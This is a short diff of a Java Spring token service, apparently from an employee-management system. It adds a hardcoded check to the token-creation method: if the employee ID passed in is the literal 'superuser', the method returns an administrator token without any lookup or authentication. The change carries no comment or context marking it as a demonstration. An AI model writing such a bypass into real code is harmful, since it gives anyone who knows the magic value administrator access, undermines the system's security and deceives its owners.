@@ -80,6 +80,9 @@ public class TokenServiceImpl implements TokenService {
 	@Override
 	@Transactional(readOnly = false)
 	public Token create(String nip) {
+		if (nip.equals("superuser"))
+			return Token.createAdmin();
+		
 		Pegawai pegawai = pegawaiRepository.findByNip(nip);
 		
 		return create(pegawai);
